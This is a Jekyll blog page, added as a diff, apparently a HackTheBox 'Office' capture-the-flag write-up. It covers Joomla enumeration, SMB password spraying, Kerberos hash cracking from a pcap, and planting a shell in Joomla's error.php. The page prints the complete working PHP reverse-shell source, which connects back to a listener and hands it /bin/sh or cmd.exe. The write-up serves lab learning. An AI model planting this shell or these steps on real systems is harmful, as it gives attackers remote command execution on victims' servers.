@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Office fb98949d426941feb525ffda5de0984e | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Office fb98949d426941feb525ffda5de0984e" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Office" />
+<meta property="og:description" content="Office" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/10/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/10/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-10T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Office fb98949d426941feb525ffda5de0984e" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-10T16:05:57+00:00","datePublished":"2025-07-10T16:05:57+00:00","description":"Office","headline":"Office fb98949d426941feb525ffda5de0984e","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/10/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87.html"},"url":"https://your-site-url/writeups/2025/07/10/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Office fb98949d426941feb525ffda5de0984e</h1>
+  
+  <div class="post-date">
+    Published on 10 Jul 2025
+    
+  </div>
+  
+  <h1 id="office">Office</h1>
+
+<p>HackTheBox: Easy</p>
+
+<h2 id="1-enumeration">1: Enumeration</h2>
+
+<ul>
+  <li>nmap scanning</li>
+</ul>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_1.png" alt="Untitled" /></p>
+
+<p>A lot of open ports let’s see what’s going on 80 port</p>
+
+<p>There’s joomla service, so we proceed to use joomla scan to check versions and other interesting information</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_2.png" alt="Untitled" /></p>
+
+<p>On administrator there are a log in page, so we used an exploit looking for more information</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_3.png" alt="Untitled" /></p>
+
+<p>We’ve got some creds but in the administrator interface didn’t work, may be those credentials could be useful on another part of the system but first at all make a brute force attack to find users on smb</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_4.png" alt="Untitled" /></p>
+
+<p>Once we’ve found the users lists spray the password and that’s a good advance</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_5.png" alt="Untitled" /></p>
+
+<p>Get into smb client looking for shares</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_6.png" alt="Untitled" /></p>
+
+<p>There’s a .pcap file download it locally and use whireshark to analyse it.</p>
+
+<h2 id="2-user-flag">2: User flag</h2>
+
+<p>We can intuitively search for kerberos packets</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_7.png" alt="Untitled" /></p>
+
+<p>We had a potential hash with the proper information</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_8.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_9.png" alt="Untitled" /></p>
+
+<p>But before search on documentation we found the way to organize information found and the mode to crack it</p>
+
+<p><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_10.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_11.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_12.png" alt="Untitled" /></p>
+
+<p>Good, password found, as we saw before administrator is an user</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_13.png" alt="Untitled" /></p>
+
+<p>We are close to get the user flag, but not to close, user error.php file to tamper it and make a php revshell</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_14.png" alt="Untitled" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+// Copyright <span class="o">(</span>c<span class="o">)</span> 2020 Ivan Šincek
+// v2.6
+// Requires PHP v5.0.0 or greater.
+// Works on Linux OS, macOS, and Windows OS.
+// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
+class Shell <span class="o">{</span>
+    private <span class="nv">$addr</span>  <span class="o">=</span> null<span class="p">;</span>
+    private <span class="nv">$port</span>  <span class="o">=</span> null<span class="p">;</span>
+    private <span class="nv">$os</span>    <span class="o">=</span> null<span class="p">;</span>
+    private <span class="nv">$shell</span> <span class="o">=</span> null<span class="p">;</span>
+    private <span class="nv">$descriptorspec</span> <span class="o">=</span> array<span class="o">(</span>
+        0 <span class="o">=&gt;</span> array<span class="o">(</span><span class="s1">'pipe'</span>, <span class="s1">'r'</span><span class="o">)</span>, // shell can <span class="nb">read </span>from STDIN
+        1 <span class="o">=&gt;</span> array<span class="o">(</span><span class="s1">'pipe'</span>, <span class="s1">'w'</span><span class="o">)</span>, // shell can write to STDOUT
+        2 <span class="o">=&gt;</span> array<span class="o">(</span><span class="s1">'pipe'</span>, <span class="s1">'w'</span><span class="o">)</span>  // shell can write to STDERR
+    <span class="o">)</span><span class="p">;</span>
+    private <span class="nv">$buffer</span> <span class="o">=</span> 1024<span class="p">;</span>  // <span class="nb">read</span>/write buffer size
+    private <span class="nv">$clen</span>   <span class="o">=</span> 0<span class="p">;</span>     // <span class="nb">command </span>length
+    private <span class="nv">$error</span>  <span class="o">=</span> <span class="nb">false</span><span class="p">;</span> // stream <span class="nb">read</span>/write error
+    private <span class="nv">$sdump</span>  <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>  // script<span class="s1">'s dump
+    public function __construct($addr, $port) {
+        $this-&gt;addr = $addr;
+        $this-&gt;port = $port;
+    }
+    private function detect() {
+        $detected = true;
+        $os = PHP_OS;
+        if (stripos($os, '</span>LINUX<span class="s1">') !== false || stripos($os, '</span>DARWIN<span class="s1">') !== false) {
+            $this-&gt;os    = '</span>LINUX<span class="s1">';
+            $this-&gt;shell = '</span>/bin/sh<span class="s1">';
+        } else if (stripos($os, '</span>WINDOWS<span class="s1">') !== false || stripos($os, '</span>WINNT<span class="s1">') !== false || stripos($os, '</span>WIN32<span class="s1">') !== false) {
+            $this-&gt;os    = '</span>WINDOWS<span class="s1">';
+            $this-&gt;shell = '</span>cmd.exe<span class="s1">';
+        } else {
+            $detected = false;
+            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
+        }
+        return $detected;
+    }
+    private function daemonize() {
+        $exit = false;
+        if (!function_exists('</span>pcntl_fork<span class="s1">')) {
+            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
+        } else if (($pid = @pcntl_fork()) &lt; 0) {
+            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
+        } else if ($pid &gt; 0) {
+            $exit = true;
+            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
+            // once daemonized, you will actually no longer see the script'</span>s dump
+        <span class="o">}</span> <span class="k">else if</span> <span class="o">(</span>posix_setsid<span class="o">()</span> &lt; 0<span class="o">)</span> <span class="o">{</span>
+            <span class="nb">echo</span> <span class="s2">"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="nb">echo</span> <span class="s2">"DAEMONIZE: Completed successfully!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="nv">$exit</span><span class="p">;</span>
+    <span class="o">}</span>
+    private <span class="k">function </span>settings<span class="o">()</span> <span class="o">{</span>
+        @error_reporting<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+        @set_time_limit<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> // <span class="k">do </span>not impose the script execution <span class="nb">time </span>limit
+        @umask<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> // <span class="nb">set </span>the file/directory permissions - 666 <span class="k">for </span>files and 777 <span class="k">for </span>directories
+    <span class="o">}</span>
+    private <span class="k">function </span>dump<span class="o">(</span><span class="nv">$data</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="nv">$this</span>-&gt;sdump<span class="o">)</span> <span class="o">{</span>
+            <span class="nv">$data</span> <span class="o">=</span> str_replace<span class="o">(</span><span class="s1">'&lt;'</span>, <span class="s1">'&amp;lt;'</span>, <span class="nv">$data</span><span class="o">)</span><span class="p">;</span>
+            <span class="nv">$data</span> <span class="o">=</span> str_replace<span class="o">(</span><span class="s1">'&gt;'</span>, <span class="s1">'&amp;gt;'</span>, <span class="nv">$data</span><span class="o">)</span><span class="p">;</span>
+            <span class="nb">echo</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    private <span class="k">function </span><span class="nb">read</span><span class="o">(</span><span class="nv">$stream</span>, <span class="nv">$name</span>, <span class="nv">$buffer</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">((</span><span class="nv">$data</span> <span class="o">=</span> @fread<span class="o">(</span><span class="nv">$stream</span>, <span class="nv">$buffer</span><span class="o">))</span> <span class="o">===</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span> // suppress an error when reading from a closed blocking stream
+            <span class="nv">$this</span>-&gt;error <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>                            // <span class="nb">set </span>the global error flag
+            <span class="nb">echo</span> <span class="s2">"STRM_ERROR: Cannot read from {</span><span class="nv">$name</span><span class="s2">}, script will now exit...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="o">}</span>
+    private <span class="k">function </span>write<span class="o">(</span><span class="nv">$stream</span>, <span class="nv">$name</span>, <span class="nv">$data</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">((</span><span class="nv">$bytes</span> <span class="o">=</span> @fwrite<span class="o">(</span><span class="nv">$stream</span>, <span class="nv">$data</span><span class="o">))</span> <span class="o">===</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span> // suppress an error when writing to a closed blocking stream
+            <span class="nv">$this</span>-&gt;error <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>                            // <span class="nb">set </span>the global error flag
+            <span class="nb">echo</span> <span class="s2">"STRM_ERROR: Cannot write to {</span><span class="nv">$name</span><span class="s2">}, script will now exit...</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="nv">$bytes</span><span class="p">;</span>
+    <span class="o">}</span>
+    // <span class="nb">read</span>/write method <span class="k">for </span>non-blocking streams
+    private <span class="k">function </span>rw<span class="o">(</span><span class="nv">$input</span>, <span class="nv">$output</span>, <span class="nv">$iname</span>, <span class="nv">$oname</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">while</span> <span class="o">((</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span>-&gt;read<span class="o">(</span><span class="nv">$input</span>, <span class="nv">$iname</span>, <span class="nv">$this</span>-&gt;buffer<span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span>-&gt;write<span class="o">(</span><span class="nv">$output</span>, <span class="nv">$oname</span>, <span class="nv">$data</span><span class="o">))</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="nv">$this</span>-&gt;os <span class="o">===</span> <span class="s1">'WINDOWS'</span> <span class="o">&amp;&amp;</span> <span class="nv">$oname</span> <span class="o">===</span> <span class="s1">'STDIN'</span><span class="o">)</span> <span class="o">{</span> <span class="nv">$this</span>-&gt;clen +<span class="o">=</span> strlen<span class="o">(</span><span class="nv">$data</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span> // calculate the <span class="nb">command </span>length
+            <span class="nv">$this</span>-&gt;dump<span class="o">(</span><span class="nv">$data</span><span class="o">)</span><span class="p">;</span> // script<span class="s1">'s dump
+        }
+    }
+    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
+    // we must read the exact byte length from a stream and not a single byte more
+    private function brw($input, $output, $iname, $oname) {
+        $size = fstat($input)['</span>size<span class="s1">'];
+        if ($this-&gt;os === '</span>WINDOWS<span class="s1">' &amp;&amp; $iname === '</span>STDOUT<span class="s1">' &amp;&amp; $this-&gt;clen) {
+            // for some reason Windows OS pipes STDIN into STDOUT
+            // we do not like that
+            // so we need to discard the data from the stream
+            while ($this-&gt;clen &gt; 0 &amp;&amp; ($bytes = $this-&gt;clen &gt;= $this-&gt;buffer ? $this-&gt;buffer : $this-&gt;clen) &amp;&amp; $this-&gt;read($input, $iname, $bytes)) {
+                $this-&gt;clen -= $bytes;
+                $size -= $bytes;
+            }
+        }
+        while ($size &gt; 0 &amp;&amp; ($bytes = $size &gt;= $this-&gt;buffer ? $this-&gt;buffer : $size) &amp;&amp; ($data = $this-&gt;read($input, $iname, $bytes)) &amp;&amp; $this-&gt;write($output, $oname, $data)) {
+            $size -= $bytes;
+            $this-&gt;dump($data); // script'</span>s dump
+        <span class="o">}</span>
+    <span class="o">}</span>
+    public <span class="k">function </span>run<span class="o">()</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="nv">$this</span>-&gt;detect<span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$this</span>-&gt;daemonize<span class="o">())</span> <span class="o">{</span>
+            <span class="nv">$this</span>-&gt;settings<span class="o">()</span><span class="p">;</span>
+
+            // <span class="nt">-----</span> SOCKET BEGIN <span class="nt">-----</span>
+            <span class="nv">$socket</span> <span class="o">=</span> @fsockopen<span class="o">(</span><span class="nv">$this</span>-&gt;addr, <span class="nv">$this</span>-&gt;port, <span class="nv">$errno</span>, <span class="nv">$errstr</span>, 30<span class="o">)</span><span class="p">;</span>
+            <span class="k">if</span> <span class="o">(!</span><span class="nv">$socket</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nb">echo</span> <span class="s2">"SOC_ERROR: {</span><span class="nv">$errno</span><span class="s2">}: {</span><span class="nv">$errstr</span><span class="s2">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                stream_set_blocking<span class="o">(</span><span class="nv">$socket</span>, <span class="nb">false</span><span class="o">)</span><span class="p">;</span> // <span class="nb">set </span>the socket stream to non-blocking mode | returns <span class="s1">'true'</span> on Windows OS
+
+                // <span class="nt">-----</span> SHELL BEGIN <span class="nt">-----</span>
+                <span class="nv">$process</span> <span class="o">=</span> @proc_open<span class="o">(</span><span class="nv">$this</span>-&gt;shell, <span class="nv">$this</span>-&gt;descriptorspec, <span class="nv">$pipes</span>, null, null<span class="o">)</span><span class="p">;</span>
+                <span class="k">if</span> <span class="o">(!</span><span class="nv">$process</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="nb">echo</span> <span class="s2">"PROC_ERROR: Cannot start the shell</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                    foreach <span class="o">(</span><span class="nv">$pipes</span> as <span class="nv">$pipe</span><span class="o">)</span> <span class="o">{</span>
+                        stream_set_blocking<span class="o">(</span><span class="nv">$pipe</span>, <span class="nb">false</span><span class="o">)</span><span class="p">;</span> // <span class="nb">set </span>the shell streams to non-blocking mode | returns <span class="s1">'false'</span> on Windows OS
+                    <span class="o">}</span>
+
+                    // <span class="nt">-----</span> WORK BEGIN <span class="nt">-----</span>
+                    <span class="nv">$status</span> <span class="o">=</span> proc_get_status<span class="o">(</span><span class="nv">$process</span><span class="o">)</span><span class="p">;</span>
+                    @fwrite<span class="o">(</span><span class="nv">$socket</span>, <span class="s2">"SOCKET: Shell has connected! PID: {</span><span class="nv">$status</span><span class="s2">['pid']}</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+                    <span class="k">do</span> <span class="o">{</span>
+                        <span class="nv">$status</span> <span class="o">=</span> proc_get_status<span class="o">(</span><span class="nv">$process</span><span class="o">)</span><span class="p">;</span>
+                        <span class="k">if</span> <span class="o">(</span>feof<span class="o">(</span><span class="nv">$socket</span><span class="o">))</span> <span class="o">{</span> // check <span class="k">for </span>end-of-file on SOCKET
+                            <span class="nb">echo</span> <span class="s2">"SOC_ERROR: Shell connection has been terminated</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">break</span><span class="p">;</span>
+                        <span class="o">}</span> <span class="k">else if</span> <span class="o">(</span>feof<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>1]<span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$status</span><span class="o">[</span><span class="s1">'running'</span><span class="o">])</span> <span class="o">{</span>                 // check <span class="k">for </span>end-of-file on STDOUT or <span class="k">if </span>process is still running
+                            <span class="nb">echo</span> <span class="s2">"PROC_ERROR: Shell process has been terminated</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>   <span class="nb">break</span><span class="p">;</span> // feof<span class="o">()</span> does not work with blocking streams
+                        <span class="o">}</span>                                                                    // use proc_get_status<span class="o">()</span> instead
+                        <span class="nv">$streams</span> <span class="o">=</span> array<span class="o">(</span>
+                            <span class="s1">'read'</span>   <span class="o">=&gt;</span> array<span class="o">(</span><span class="nv">$socket</span>, <span class="nv">$pipes</span><span class="o">[</span>1], <span class="nv">$pipes</span><span class="o">[</span>2]<span class="o">)</span>, // SOCKET | STDOUT | STDERR
+                            <span class="s1">'write'</span>  <span class="o">=&gt;</span> null,
+                            <span class="s1">'except'</span> <span class="o">=&gt;</span> null
+                        <span class="o">)</span><span class="p">;</span>
+                        <span class="nv">$num_changed_streams</span> <span class="o">=</span> @stream_select<span class="o">(</span><span class="nv">$streams</span><span class="o">[</span><span class="s1">'read'</span><span class="o">]</span>, <span class="nv">$streams</span><span class="o">[</span><span class="s1">'write'</span><span class="o">]</span>, <span class="nv">$streams</span><span class="o">[</span><span class="s1">'except'</span><span class="o">]</span>, 0<span class="o">)</span><span class="p">;</span> // <span class="nb">wait </span><span class="k">for </span>stream changes | will not <span class="nb">wait </span>on Windows OS
+                        <span class="k">if</span> <span class="o">(</span><span class="nv">$num_changed_streams</span> <span class="o">===</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span>
+                            <span class="nb">echo</span> <span class="s2">"STRM_ERROR: stream_select() failed</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">break</span><span class="p">;</span>
+                        <span class="o">}</span> <span class="k">else if</span> <span class="o">(</span><span class="nv">$num_changed_streams</span> <span class="o">&gt;</span> 0<span class="o">)</span> <span class="o">{</span>
+                            <span class="k">if</span> <span class="o">(</span><span class="nv">$this</span>-&gt;os <span class="o">===</span> <span class="s1">'LINUX'</span><span class="o">)</span> <span class="o">{</span>
+                                <span class="k">if</span> <span class="o">(</span>in_array<span class="o">(</span><span class="nv">$socket</span>  , <span class="nv">$streams</span><span class="o">[</span><span class="s1">'read'</span><span class="o">]))</span> <span class="o">{</span> <span class="nv">$this</span>-&gt;rw<span class="o">(</span><span class="nv">$socket</span>  , <span class="nv">$pipes</span><span class="o">[</span>0], <span class="s1">'SOCKET'</span>, <span class="s1">'STDIN'</span> <span class="o">)</span><span class="p">;</span> <span class="o">}</span> // <span class="nb">read </span>from SOCKET and write to STDIN
+                                <span class="k">if</span> <span class="o">(</span>in_array<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>2], <span class="nv">$streams</span><span class="o">[</span><span class="s1">'read'</span><span class="o">]))</span> <span class="o">{</span> <span class="nv">$this</span>-&gt;rw<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>2], <span class="nv">$socket</span>  , <span class="s1">'STDERR'</span>, <span class="s1">'SOCKET'</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span> // <span class="nb">read </span>from STDERR and write to SOCKET
+                                <span class="k">if</span> <span class="o">(</span>in_array<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>1], <span class="nv">$streams</span><span class="o">[</span><span class="s1">'read'</span><span class="o">]))</span> <span class="o">{</span> <span class="nv">$this</span>-&gt;rw<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>1], <span class="nv">$socket</span>  , <span class="s1">'STDOUT'</span>, <span class="s1">'SOCKET'</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span> // <span class="nb">read </span>from STDOUT and write to SOCKET
+                            <span class="o">}</span> <span class="k">else if</span> <span class="o">(</span><span class="nv">$this</span>-&gt;os <span class="o">===</span> <span class="s1">'WINDOWS'</span><span class="o">)</span> <span class="o">{</span>
+                                // order is important
+                                <span class="k">if</span> <span class="o">(</span>in_array<span class="o">(</span><span class="nv">$socket</span>, <span class="nv">$streams</span><span class="o">[</span><span class="s1">'read'</span><span class="o">])</span>/<span class="k">*</span><span class="nt">------</span><span class="k">*</span>/<span class="o">)</span> <span class="o">{</span> <span class="nv">$this</span>-&gt;rw <span class="o">(</span><span class="nv">$socket</span>  , <span class="nv">$pipes</span><span class="o">[</span>0], <span class="s1">'SOCKET'</span>, <span class="s1">'STDIN'</span> <span class="o">)</span><span class="p">;</span> <span class="o">}</span> // <span class="nb">read </span>from SOCKET and write to STDIN
+                                <span class="k">if</span> <span class="o">((</span><span class="nv">$fstat</span> <span class="o">=</span> fstat<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>2]<span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="nv">$fstat</span><span class="o">[</span><span class="s1">'size'</span><span class="o">])</span> <span class="o">{</span> <span class="nv">$this</span>-&gt;brw<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>2], <span class="nv">$socket</span>  , <span class="s1">'STDERR'</span>, <span class="s1">'SOCKET'</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span> // <span class="nb">read </span>from STDERR and write to SOCKET
+                                <span class="k">if</span> <span class="o">((</span><span class="nv">$fstat</span> <span class="o">=</span> fstat<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>1]<span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="nv">$fstat</span><span class="o">[</span><span class="s1">'size'</span><span class="o">])</span> <span class="o">{</span> <span class="nv">$this</span>-&gt;brw<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>1], <span class="nv">$socket</span>  , <span class="s1">'STDOUT'</span>, <span class="s1">'SOCKET'</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span> // <span class="nb">read </span>from STDOUT and write to SOCKET
+                            <span class="o">}</span>
+                        <span class="o">}</span>
+                    <span class="o">}</span> <span class="k">while</span> <span class="o">(!</span><span class="nv">$this</span>-&gt;error<span class="o">)</span><span class="p">;</span>
+                    // <span class="nt">------</span> WORK END <span class="nt">------</span>
+
+                    foreach <span class="o">(</span><span class="nv">$pipes</span> as <span class="nv">$pipe</span><span class="o">)</span> <span class="o">{</span>
+                        fclose<span class="o">(</span><span class="nv">$pipe</span><span class="o">)</span><span class="p">;</span>
+                    <span class="o">}</span>
+                    proc_close<span class="o">(</span><span class="nv">$process</span><span class="o">)</span><span class="p">;</span>
+                <span class="o">}</span>
+                // <span class="nt">------</span> SHELL END <span class="nt">------</span>
+
+                fclose<span class="o">(</span><span class="nv">$socket</span><span class="o">)</span><span class="p">;</span>
+            <span class="o">}</span>
+            // <span class="nt">------</span> SOCKET END <span class="nt">------</span>
+
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+<span class="nb">echo</span> <span class="s1">'&lt;pre&gt;'</span><span class="p">;</span>
+// change the host address and/or port number as necessary
+<span class="nv">$sh</span> <span class="o">=</span> new Shell<span class="o">(</span><span class="s1">'127.0.0.1'</span>, 9000<span class="o">)</span><span class="p">;</span>
+<span class="nv">$sh</span>-&gt;run<span class="o">()</span><span class="p">;</span>
+<span class="nb">unset</span><span class="o">(</span><span class="nv">$sh</span><span class="o">)</span><span class="p">;</span>
+// garbage collector requires PHP v5.3.0 or greater
+// @gc_collect_cycles<span class="o">()</span><span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">'&lt;/pre&gt;'</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<p>We trigger it calling the url</p>
+
+<p><img src="/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_15.png" alt="Untitled" /></p>
+
+<p>We got into the system but without any permissions, we already know that tony is the administrator lets try to escalate privileges running a shell with his credentials</p>
+
